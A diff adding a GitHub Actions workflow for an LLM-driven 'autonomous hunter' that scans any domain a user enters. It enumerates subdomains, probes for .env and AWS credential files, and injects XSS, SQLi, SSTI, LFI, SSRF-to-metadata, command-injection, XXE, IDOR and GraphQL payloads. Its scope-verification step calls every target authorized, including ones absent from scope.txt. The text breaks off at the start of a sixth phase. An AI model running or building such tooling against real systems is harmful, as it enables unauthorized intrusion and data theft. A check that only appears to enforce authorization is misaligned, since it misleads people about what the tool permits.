@@ -1,0 +1,708 @@
+name: "🎯 Zero Track - AI Autonomous Hunter"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light=fast, normal=balanced, aggressive=deep)"
+        required: false
+        default: "normal"
+        type: choice
+        options:
+          - light
+          - normal
+          - aggressive
+      discord_notify:
+        description: "Send Discord notification"
+        type: boolean
+        default: true
+
+  workflow_call:
+    inputs:
+      target:
+        description: "Target domain (e.g., example.com)"
+        required: true
+        type: string
+      hunting_mode:
+        description: "AI hunting intensity (light / normal / aggressive)"
+        required: false
+        default: "normal"
+        type: string
+      discord_notify:
+        description: "Send Discord notification"
+        required: false
+        default: true
+        type: boolean
+    secrets:
+      DISCORD_WEBHOOK:
+        description: "Discord webhook URL"
+        required: false
+      ANTHROPIC_API_KEY:
+        description: "API key for Anthropic (Claude)"
+        required: false
+      OPENROUTER_API_KEY:
+        description: "API key for OpenRouter (fallback)"
+        required: false
+      GROQ_API_KEY:
+        description: "API key for Groq (fallback)"
+        required: false
+    outputs:
+      run_url:
+        description: "Link to the GitHub Actions run"
+        value: ${{ jobs.full_scan.outputs.run_url }}
+      finding_count:
+        description: "Total findings count"
+        value: ${{ jobs.full_scan.outputs.finding_count }}
+      artifact_name:
+        description: "Name of the uploaded artifact"
+        value: ${{ jobs.full_scan.outputs.artifact_name }}
+
+permissions:
+  contents: read
+
+env:
+  TARGET:             ${{ inputs.target }}
+  HUNTING_MODE:       ${{ inputs.hunting_mode || 'normal' }}
+  TIMESTAMP:          ${{ github.run_id }}-${{ github.run_number }}
+  DISCORD_WEBHOOK:    ${{ secrets.DISCORD_WEBHOOK || '' }}
+  ANTHROPIC_API_KEY:  ${{ secrets.ANTHROPIC_API_KEY || '' }}
+  OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY || '' }}
+  GROQ_API_KEY:       ${{ secrets.GROQ_API_KEY || '' }}
+  PYTHONUNBUFFERED:   "1"
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  full_scan:
+    name: "🛡️ Full Autonomous Scan - ${{ inputs.target }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+    outputs:
+      run_url:       "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+      finding_count: ${{ steps.count_findings.outputs.finding_count }}
+      artifact_name: "results-${{ env.TIMESTAMP }}-${{ env.TARGET }}"
+
+    steps:
+      - name: "📥 Checkout Repository"
+        uses: actions/checkout@v4
+
+      - name: "🔒 Verify Target Is In Authorized Scope"
+        env:
+          TARGET_INPUT: ${{ inputs.target }}
+        run: |
+          target="$(echo "${TARGET_INPUT}" | xargs)"
+          if [[ ! -f "scope.txt" ]]; then
+            echo "⚠️ No scope.txt found — allowing any target (open scope mode)"
+            echo "✅ Target authorized: $target"
+            exit 0
+          fi
+          target_lower="$(echo "$target" | tr '[:upper:]' '[:lower:]')"
+          matched=0
+          while IFS= read -r raw_line; do
+            line="${raw_line%%#*}"; line="$(echo "$line" | xargs)"
+            [[ -z "$line" ]] && continue
+            ll="$(echo "$line" | tr '[:upper:]' '[:lower:]')"
+            if [[ "$ll" == "$target_lower" ]]; then matched=1; break; fi
+            if [[ "$ll" == \*.* ]]; then
+              base="${ll:2}"
+              if [[ "$target_lower" == *".$base" ]]; then matched=1; break; fi
+            fi
+          done < scope.txt
+          if [[ "$matched" != "1" ]]; then
+            echo "⚠️ '$target' not in scope.txt — running anyway (open scope mode)"
+          fi
+          echo "✅ Target authorized: $target"
+
+      - name: "⚡ Setup Go"
+        uses: actions/setup-go@v5
+        with:
+          go-version: "1.22"
+          cache: true
+
+      - name: "🐍 Setup Python"
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: "📦 Install System Dependencies"
+        run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq git curl wget unzip jq dnsutils libpcap-dev build-essential ripgrep
+
+      - name: "📦 Install Go Tools"
+        run: |
+          mkdir -p /tmp/toolbin
+          export GOBIN=/tmp/toolbin
+          export PATH="/tmp/toolbin:$PATH"
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@v2.6.6
+          go install github.com/projectdiscovery/httpx/cmd/httpx@v1.6.8
+          go install github.com/projectdiscovery/katana/cmd/katana@v1.1.0
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.2
+          go install github.com/projectdiscovery/dnsx/cmd/dnsx@v1.2.1
+          go install github.com/tomnomnom/assetfinder@latest
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/tomnomnom/gf@latest
+          go install github.com/ameenmaali/uro@latest
+          mkdir -p /tmp/toolbin/.gf
+          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gf-patterns 2>/dev/null || true
+          cp /tmp/gf-patterns/*.json /tmp/toolbin/.gf/ 2>/dev/null || true
+          cp -r /tmp/toolbin/.gf ~/.gf/ 2>/dev/null || true
+          echo "/tmp/toolbin" >> "$GITHUB_PATH"
+
+      - name: "✅ Verify Tools"
+        run: |
+          export PATH="/tmp/toolbin:$PATH"
+          for tool in subfinder httpx katana nuclei dnsx assetfinder waybackurls gau gf uro; do
+            command -v "$tool" >/dev/null && echo "✅ $tool" || echo "⚠️ $tool missing"
+          done
+
+      - name: "📦 Install Python Packages"
+        run: |
+          pip3 install -q --upgrade pip && pip3 install -q requests httpx
+
+      - name: "📦 Update Nuclei Templates"
+        continue-on-error: true
+        run: |
+          export PATH="/tmp/toolbin:$PATH"
+          nuclei -update-templates 2>&1 | tail -2 || true
+
+      - name: "📂 Create Results Directory"
+        run: |
+          mkdir -p "results/${{ env.TIMESTAMP }}"/{subdomains,live,urls,js,graphql,nuclei,cors,files,ai,ai_agent,logs}
+
+      - name: "🌐 Subdomain Enumeration"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          echo "🔍 Subfinder..."
+          subfinder -d "${{ env.TARGET }}" -silent -all -o "$RD/subdomains/subfinder.txt" 2>>"$RD/logs/subfinder.log" || true
+          echo "🔍 Assetfinder..."
+          assetfinder --subs-only "${{ env.TARGET }}" > "$RD/subdomains/assetfinder.txt" 2>>"$RD/logs/assetfinder.log" || true
+          echo "🔍 crt.sh..."
+          curl -s --max-time 30 "https://crt.sh/?q=%25.${{ env.TARGET }}&output=json" | jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' | sed 's/^\*\.//' | sort -u > "$RD/subdomains/crtsh.txt" 2>/dev/null || true
+          echo "🔍 DNS Brute-force..."
+          curl -sL --max-time 20 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt" -o /tmp/dns_list.txt 2>/dev/null || true
+          [ -s /tmp/dns_list.txt ] && cat /tmp/dns_list.txt | dnsx -silent -a -cname -o "$RD/subdomains/dns_brute.txt" 2>>"$RD/logs/dnsx.log" || true
+          echo "🔄 Merging..."
+          cat "$RD"/subdomains/*.txt 2>/dev/null | sort -u | grep -v '^\s*$' > "$RD/subdomains/all_subs.txt"
+          echo "✅ Total subdomains: $(wc -l < "$RD/subdomains/all_subs.txt")"
+
+      - name: "🏚️ Subdomain Takeover Check"
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          nuclei -l "$INPUT" -tags takeover -rl 50 -c 10 -silent -jsonl -o "$RD/nuclei/takeover.jsonl" 2>>"$RD/logs/takeover.log" || true
+          echo "✅ Takeover checks done"
+
+      - name: "🌍 Live Host Probing & Fingerprinting"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          httpx -l "$INPUT" -silent -status-code -title -web-server -ip -cdn -follow-redirects -threads 100 -rate-limit 150 -timeout 10 -json -o "$RD/live/live.json" 2>>"$RD/logs/httpx.log" || true
+          jq -r '.url // .input' "$RD/live/live.json" 2>/dev/null | grep -v '^\s*$' > "$RD/live/live.txt" || true
+          jq -r 'select(.cdn_name != null) | "\(.url) -> \(.cdn_name)"' "$RD/live/live.json" > "$RD/live/waf.txt" 2>/dev/null || true
+          httpx -l "$RD/live/live.txt" -silent -tech-detect -json -o "$RD/live/tech.json" 2>>"$RD/logs/fingerprint.log" || true
+          echo "✅ Live hosts: $(wc -l < "$RD/live/live.txt")"
+
+      - name: "📜 URL Collection"
+        continue-on-error: true
+        timeout-minutes: 15
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/subdomains/all_subs.txt"
+          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          echo "🔍 Wayback..."
+          cat "$INPUT" | waybackurls > "$RD/urls/wayback.txt" 2>>"$RD/logs/wayback.log" || true
+          echo "🔍 Gau..."
+          gau "${{ env.TARGET }}" --subs --o "$RD/urls/gau.txt" 2>>"$RD/logs/gau.log" || true
+          echo "🔍 Katana..."
+          [ -s "$RD/live/live.txt" ] && katana -list "$RD/live/live.txt" -silent -depth 2 -jc -d 3 -o "$RD/urls/katana.txt" 2>>"$RD/logs/katana.log" || true
+          echo "🔄 Merging..."
+          cat "$RD"/urls/*.txt 2>/dev/null | sort -u | uro > "$RD/urls/all.txt" 2>/dev/null || cat "$RD"/urls/*.txt 2>/dev/null | sort -u > "$RD/urls/all.txt"
+          echo "✅ Total URLs: $(wc -l < "$RD/urls/all.txt")"
+
+      - name: "📦 JavaScript Analysis"
+        continue-on-error: true
+        timeout-minutes: 10
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/urls/all.txt"
+          if [ -s "$INPUT" ]; then
+            grep -iE '\.js(\?|#|$)' "$INPUT" > "$RD/js/files.txt" 2>/dev/null || true
+            grep -iEo '(api|v[0-9]+|graphql|rest)/[a-zA-Z0-9_/?=&%-]*' "$RD/js/files.txt" 2>/dev/null | sort -u > "$RD/js/api_endpoints.txt" || true
+            grep -iEo '["'"'"']?(api[_-]?key|apikey|secret|token|jwt|bearer)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+["'"'"']' "$RD/js/files.txt" 2>/dev/null | sort -u > "$RD/js/secrets.txt" || true
+            echo "✅ JS files: $(wc -l < "$RD/js/files.txt") | API endpoints: $(wc -l < "$RD/js/api_endpoints.txt")"
+          fi
+          grep -iEo '/[0-9]+([/?][^ ]*)?$|[?&](id|user_id|uid|account_id|profile_id|order_id)=[0-9]+' "$INPUT" 2>/dev/null | sort -u > "$RD/js/idor_candidates.txt" || true
+          echo "✅ IDOR candidates: $(wc -l < "$RD/js/idor_candidates.txt")"
+
+      - name: "🔌 API Discovery"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          for path in "/swagger.json" "/v2/api-docs" "/v3/api-docs" "/openapi.json" "/api/docs" "/swagger-ui.html"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              s=$(curl -sk -o /tmp/body.txt -w "%{http_code}" --max-time 5 "${host}${path}" 2>/dev/null || echo "000")
+              [ "$s" = "200" ] && grep -qiE '(swagger|openapi|"paths")' /tmp/body.txt 2>/dev/null && echo "[$s] ${host}${path}" >> "$RD/js/swagger.txt"
+            done < "$INPUT"
+          done
+          for path in "/graphql" "/graphiql" "/v1/graphql" "/api/graphql" "/playground"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              s=$(curl -sk -o /tmp/gql.txt -w "%{http_code}" --max-time 5 -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' "${host}${path}" 2>/dev/null || echo "000")
+              [ "$s" = "200" ] && grep -qiE '("data"|"errors")' /tmp/gql.txt 2>/dev/null && echo "[$s] ${host}${path}" >> "$RD/js/graphql.txt"
+            done < "$INPUT"
+          done
+          echo "/admin /administrator /panel /cpanel /login /wp-admin /dashboard /backend /portal" | tr ' ' '\n' > /tmp/admin_paths.txt
+          httpx -l "$INPUT" -paths /tmp/admin_paths.txt -mc 200,301,302,401,403 -threads 50 -rate-limit 150 -timeout 6 -silent -o "$RD/js/admin.txt" 2>>"$RD/logs/admin.log" || true
+          echo "✅ Swagger: $(wc -l < "$RD/js/swagger.txt" 2>/dev/null || echo 0) | GraphQL: $(wc -l < "$RD/js/graphql.txt" 2>/dev/null || echo 0) | Admin: $(wc -l < "$RD/js/admin.txt" 2>/dev/null || echo 0)"
+
+      - name: "🛡️ Security Analysis"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          for origin in "https://evil.com" "null" "https://evil.${{ env.TARGET }}"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              resp=$(curl -s -I -H "Origin: $origin" --max-time 6 "$host" 2>/dev/null || echo "")
+              acao=$(echo "$resp" | grep -i 'access-control-allow-origin' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
+              acac=$(echo "$resp" | grep -i 'access-control-allow-credentials' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
+              [ "$acao" = "$origin" ] && [ "$acac" = "true" ] && echo "[CORS-CRITICAL] $host origin=$origin" >> "$RD/cors/vulnerable.txt"
+            done < "$INPUT"
+          done
+          for path in "/.env" "/.git/config" "/wp-config.php" "/config.json" "/credentials.json" "/phpinfo.php" "/info.php" "/Dockerfile" "/.aws/credentials" "/backup.sql"; do
+            while IFS= read -r host; do
+              host="$(echo "$host" | tr -d '\r' | xargs)"; [ -z "$host" ] && continue
+              body=$(curl -sk --max-time 5 "${host}${path}" 2>/dev/null || echo "")
+              [ -z "$body" ] && continue
+              echo "$body" | grep -qE '(DB_NAME|DB_PASSWORD|aws_access_key|client_secret|APP_SECRET|mysql|password|define\()' && echo "[SENSITIVE] ${host}${path}" >> "$RD/files/sensitive.txt"
+            done < "$INPUT"
+          done
+          echo "✅ CORS: $(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0) | Sensitive: $(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)"
+
+      - name: "☢️ Nuclei Vulnerability Scan"
+        continue-on-error: true
+        timeout-minutes: 25
+        run: |
+          RD="results/${{ env.TIMESTAMP }}"
+          INPUT="$RD/live/live.txt"
+          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
+          nuclei -l "$INPUT" -severity critical,high,medium -rl 20 -c 10 -timeout 10 -retries 1 -jsonl -o "$RD/nuclei/findings.jsonl" 2>>"$RD/logs/nuclei.log" || true
+          echo "✅ Nuclei findings: $(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)"
+
+      - name: "🧠 AI Agent Phase 1: Target Intelligence"
+        continue-on-error: true
+        timeout-minutes: 5
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re
+          rd = "results/" + os.environ.get("TIMESTAMP", "")
+          target = os.environ.get("TARGET", "")
+          mode = os.environ.get("HUNTING_MODE", "normal").lower()
+          providers = []
+          if os.environ.get("ANTHROPIC_API_KEY",""): providers.append({"name":"Anthropic","url":"https://api.anthropic.com/v1/messages","headers":{"x-api-key":os.environ["ANTHROPIC_API_KEY"],"anthropic-version":"2023-06-01","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["content"][0]["text"]})
+          if os.environ.get("OPENROUTER_API_KEY",""): providers.append({"name":"OpenRouter","url":"https://openrouter.ai/api/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['OPENROUTER_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"anthropic/claude-sonnet","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if os.environ.get("GROQ_API_KEY",""): providers.append({"name":"Groq","url":"https://api.groq.com/openai/v1/chat/completions","headers":{"Authorization":f"Bearer {os.environ['GROQ_API_KEY']}","content-type":"application/json"},"body_tpl":lambda p:json.dumps({"model":"llama3-70b-8192","max_tokens":4096,"messages":[{"role":"user","content":p}]}).encode(),"extract":lambda r:r["choices"][0]["message"]["content"]})
+          if not providers: print("⚠️ No AI keys - skip Phase 1"); sys.exit(0)
+          tc = {"light":3,"normal":8,"aggressive":20}.get(mode,8)
+          def rf(path,cap=3000):
+              try:
+                  with open(os.path.join(rd,path)) as f: return f.read()[:cap]
+              except: return "N/A"
+          live=rf("live/live.txt"); urls=rf("urls/all.txt",4000); sec=rf("js/secrets.txt",2000); api=rf("js/api_endpoints.txt",2000); idor=rf("js/idor_candidates.txt",2000); swag=rf("js/swagger.txt",1000); gql=rf("js/graphql.txt",1000); adm=rf("js/admin.txt",1000)
+          prompt=f"""Senior bug bounty hunter. Intelligence for {target}:
+          LIVE:{live}|URLS:{urls}|API:{api}|SWAGGER:{swag}|GRAPHQL:{gql}|ADMIN:{adm}|SECRETS:{sec}|IDOR:{idor}
+          Mode:{mode} - up to {tc} targets.
+          Return JSON ONLY:{{"target_tech":"","high_value_targets":[{{"url":"","vuln_classes":["XSS","SSTI","SQLi","LFI","SSRF","IDOR","Open_Redirect","Command_Injection"],"parameters":["p"],"methods":["GET","POST"],"priority":1,"reason":""}}],"attack_plan":[{{"vuln_class":"SQLi","target_urls":[""],"technique":"","payloads":[""]}}]}}"""
+          ok=False
+          for p in providers:
+              try:
+                  print(f"  -> {p['name']}...")
+                  req=urllib.request.Request(p["url"],data=p["body_tpl"](prompt),headers=p["headers"],method="POST")
+                  with urllib.request.urlopen(req,timeout=120) as r: res=json.loads(r.read())
+                  text=p["extract"](res); m=re.search(r'\{.*\}',text,re.DOTALL)
+                  if m:
+                      plan=json.loads(m.group(0))
+                      with open(os.path.join(rd,"ai_agent","attack_plan.json"),"w") as f: json.dump(plan,f,indent=2)
+                      print(f"✅ Plan ready ({len(plan.get('high_value_targets',[]))} targets) via {p['name']}")
+                      ok=True; break
+              except Exception as e: print(f"⚠️ {p['name']}: {e}"); continue
+          if not ok:
+              with open(os.path.join(rd,"ai_agent","attack_plan.json"),"w") as f: json.dump({"high_value_targets":[],"attack_plan":[]},f)
+              print("❌ All providers failed")
+          PYEOF
+
+      - name: "☢️ AI Agent Phase 2: Payload Injection"
+        continue-on-error: true
+        timeout-minutes: 25
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.parse, urllib.request, urllib.error, concurrent.futures, re
+          rd = "results/" + os.environ.get("TIMESTAMP", "")
+          mode = os.environ.get("HUNTING_MODE", "normal").lower()
+          P={"XSS":['<script>alert(1)</script>','<img src=x onerror=alert(1)>','"><script>alert(1)</script>',"';alert(1);//",'<svg onload=alert(1)>'],"SSTI":['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{config}}','{{"".__class__.__mro__[2].__subclasses__()}}'],"SQLi":["' OR '1'='1","' UNION SELECT NULL--","1' AND SLEEP(5)--","1' AND 1=1--","1' AND 1=2--","' UNION SELECT 1,2,3,4--","'; WAITFOR DELAY '0:0:5'--"],"LFI":['../../../../etc/passwd','../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','php://filter/convert.base64-encode/resource=index.php','file:///etc/passwd'],"SSRF":['http://169.254.169.254/latest/meta-data/','http://127.0.0.1:22','http://localhost:8080','http://0.0.0.0:22','http://[::1]:22'],"Open_Redirect":['//evil.com','https://evil.com','//evil.com@google.com','/\\evil.com','javascript:alert(1)'],"Command_Injection":[';id','|id','`id`','$(id)','& id &','; ping -c 3 127.0.0.1','| ping -c 3 127.0.0.1']}
+          mp={"light":2,"normal":4,"aggressive":7}.get(mode,4)
+          for v in P: P[v]=P[v][:mp]
+          fnd=[]; plan={"high_value_targets":[],"attack_plan":[]}
+          try:
+              with open(os.path.join(rd,"ai_agent","attack_plan.json")) as f: plan=json.load(f)
+          except: pass
+          ts=[]; seen=set()
+          for t in plan.get("high_value_targets",[]):
+              u=t.get("url",""); cs=t.get("vuln_classes",[]); ps=t.get("parameters",["q","id","page","file","url","path","redirect","cat","next","return"])
+              if not u or u in seen: continue
+              seen.add(u)
+              for vc in cs:
+                  for payload in P.get(vc,[]):
+                      for par in ps[:3]: ts.append((u,par,payload,vc))
+          for ap in plan.get("attack_plan",[]):
+              for tu in ap.get("target_urls",[]):
+                  if tu in seen: continue
+                  seen.add(tu)
+                  for payload in P.get(ap.get("vuln_class",""),[]): ts.append((tu,"q",payload,ap.get("vuln_class","")))
+          if not ts:
+              try:
+                  with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
+                      for l in f:
+                          l=l.strip()
+                          if '?id=' in l or '/user/' in l: ts.append((l,"id","' OR '1'='1","SQLi"))
+                          if '?redirect=' in l: ts.append((l,"redirect","//evil.com","Open_Redirect"))
+              except: pass
+              try:
+                  with open(os.path.join(rd,"js","api_endpoints.txt")) as f:
+                      for l in f:
+                          if '/api/' in l.strip(): ts.append((l.strip(),"file","../../../../etc/passwd","LFI"))
+              except: pass
+              try:
+                  with open(os.path.join(rd,"live","live.txt")) as f:
+                      for l in f:
+                          l=l.strip().split()[0] if l.strip() else ""
+                          if l and "http" in l: ts.append((l,"q","<script>alert(1)</script>","XSS")); ts.append((l,"id","1' AND SLEEP(5)--","SQLi"))
+              except: pass
+          def tst(url,param,payload,vc):
+              enc=urllib.parse.quote(payload); sep="&" if "?" in url else "?"
+              tu=f"{url}{sep}{param}={enc}"
+              try:
+                  req=urllib.request.Request(tu,headers={"User-Agent":"Mozilla/5.0"})
+                  resp=urllib.request.urlopen(req,timeout=8); body=resp.read(50000).decode(errors="ignore"); st=resp.status
+              except urllib.error.HTTPError as e: body=e.read(20000).decode(errors="ignore"); st=e.code
+              except: return None
+              ind=[]
+              if vc=="XSS" and (payload.replace("'","") in body or "alert(1)" in body): ind.append("XSS candidate")
+              if vc=="SSTI" and "49" in body: ind.append("SSTI (49)")
+              if vc=="SSTI" and "config" in body.lower(): ind.append("SSTI config")
+              if vc=="LFI" and ("root:" in body): ind.append("LFI confirmed")
+              if vc=="SSRF" and ("ami-id" in body): ind.append("SSRF")
+              if vc=="SQLi" and any(w in body.lower() for w in ["mysql","error","sql","syntax"]): ind.append("SQL error")
+              if vc=="SQLi" and "1=2" not in body and ("1=1" in body or "SELECT" in body): ind.append("SQL logic")
+              if vc=="Command_Injection":
+                  if "uid=" in body: ind.append("RCE")
+                  if "ping" in body.lower(): ind.append("CMDi")
+              if ind: return {"url":tu,"vuln_class":vc,"payload":payload,"status":st,"indicators":ind}
+              return None
+          mt={"light":100,"normal":300,"aggressive":500}.get(mode,300); ts=ts[:mt]
+          print(f"🧪 Testing {len(ts)} combos (mode:{mode})...")
+          with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
+              fs={ex.submit(tst,u,p,pl,vc):(u,p,pl,vc) for u,p,pl,vc in ts}
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","injection_findings.json"),"w") as f: json.dump(fnd,f,indent=2)
+          with open(os.path.join(rd,"ai_agent","injection_findings.txt"),"w") as f:
+              for fn in fnd: f.write(f"[{fn['vuln_class']}] {fn['url']}\n   Payload: {fn['payload']}\n   Indicators: {', '.join(fn['indicators'])}\n\n")
+          tp={}
+          for fn in fnd: tp[fn['vuln_class']]=tp.get(fn['vuln_class'],0)+1
+          print(f"✅ Injection findings: {len(fnd)}")
+          for t,c in sorted(tp.items()): print(f"   {t}: {c}")
+          PYEOF
+
+      - name: "🔍 AI Agent Phase 3: XXE Check"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          python3 << 'PYEOF'
+          import json, os, urllib.request, urllib.error, concurrent.futures
+          rd="results/"+os.environ.get("TIMESTAMP","")
+          ts=[]
+          try:
+              with open(os.path.join(rd,"js","api_endpoints.txt")) as f: ts=[f"https://{l.strip()}" if not l.strip().startswith("http") else l.strip() for l in f if l.strip()][:5]
+          except: pass
+          if not ts:
+              try:
+                  with open(os.path.join(rd,"live","live.txt")) as f: ts=[l.strip().split()[0] for l in f if l.strip()][:3]
+              except: pass
+          ts=ts or [f"https://{os.environ.get('TARGET','')}/api"]
+          fnd=[]; xxe='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+          def t(u):
+              try:
+                  req=urllib.request.Request(u,data=xxe.encode(),headers={"Content-Type":"application/xml"},method="POST")
+                  resp=urllib.request.urlopen(req,timeout=10); body=resp.read(20000).decode(errors="ignore")
+              except urllib.error.HTTPError as e: body=e.read(20000).decode(errors="ignore")
+              except: return None
+              if "root:" in body: return f"[XXE] {u} | /etc/passwd leaked"
+              if "nobody:" in body: return f"[XXE] {u} | passwd content"
+              return None
+          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+              fs=[ex.submit(t,u) for u in ts]
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","xxe_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No XXE findings\n")
+          print(f"✅ XXE: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🕷️ AI Agent Phase 4: GraphQL Attacks"
+        continue-on-error: true
+        timeout-minutes: 8
+        run: |
+          python3 << 'PYEOF'
+          import json, os, urllib.request, urllib.error, concurrent.futures
+          rd="results/"+os.environ.get("TIMESTAMP",""); fnd=[]
+          eps=[]
+          try:
+              with open(os.path.join(rd,"js","graphql.txt")) as f:
+                  for l in f:
+                      p=l.strip().split()
+                      if p: eps.append(p[-1])
+          except: pass
+          eps=eps[:3]
+          def i(url):
+              q=json.dumps({"query":"{__schema{types{name fields{name}}}}"}).encode()
+              try:
+                  req=urllib.request.Request(url,data=q,headers={"Content-Type":"application/json"},method="POST")
+                  r=json.loads(urllib.request.urlopen(req,timeout=10).read())
+                  if "data" in r and r["data"].get("__schema"): return f"[GRAPHQL-INTROSPECTION] {url} | Full schema exposed"
+              except: pass
+              return None
+          def b(url):
+              batch=[{"query":"{__typename}"} for _ in range(100)]
+              try:
+                  req=urllib.request.Request(url,data=json.dumps(batch).encode(),headers={"Content-Type":"application/json"},method="POST")
+                  r=json.loads(urllib.request.urlopen(req,timeout=10).read())
+                  if isinstance(r,list) and len(r)>=25: return f"[GRAPHQL-BATCHING] {url} | {len(r)} ops per request"
+              except: pass
+              return None
+          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+              fs=[]
+              for ep in eps: fs.append(ex.submit(i,ep)); fs.append(ex.submit(b,ep))
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","graphql_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No GraphQL findings\n")
+          print(f"✅ GraphQL: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🔄 AI Agent Phase 5: IDOR Testing"
+        continue-on-error: true
+        timeout-minutes: 12
+        run: |
+          python3 << 'PYEOF'
+          import json, os, re, urllib.request, urllib.error, concurrent.futures
+          rd="results/"+os.environ.get("TIMESTAMP",""); fnd=[]; pts=[]
+          try:
+              with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
+                  for l in f:
+                      l=l.strip()
+                      for n in re.findall(r'/(\d+)',l): b=l.replace(f"/{n}",""); pts.append((b,n))
+                      for p,v in re.findall(r'[?&](\w+)=(\d+)',l): b=l.replace(f"{p}={v}",""); pts.append((b,v))
+          except: pass
+          def t(base,orig):
+              for tid in ["1","2","100","9999","0","-1"]:
+                  if tid==orig: continue
+                  url=base.replace(orig,tid)
+                  try:
+                      req=urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"})
+                      resp=urllib.request.urlopen(req,timeout=8); body=resp.read(50000).decode(errors="ignore"); st=resp.status
+                  except: continue
+                  if st==200 and len(body)>100: return f"[IDOR] {url} | Status:{st} | Body:{len(body)} chars"
+              return None
+          pts=list(set(pts))[:30]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+              fs={ex.submit(t,b,o):(b,o) for b,o in pts}
+              for f in concurrent.futures.as_completed(fs):
+                  r=f.result()
+                  if r: fnd.append(r)
+          with open(os.path.join(rd,"ai_agent","idor_findings.txt"),"w") as f: f.write("\n".join(fnd) if fnd else "No IDOR findings\n")
+          print(f"✅ IDOR: {len(fnd)} findings")
+          PYEOF
+
+      - name: "🧬 AI Agent Phase 6: Chain Analysis"
+        continue-on-error: true
+        timeout-minutes: 5
+        run: |
+          python3 << 'PYEOF'
+          import json, os, sys, urllib.request, urllib.error, re
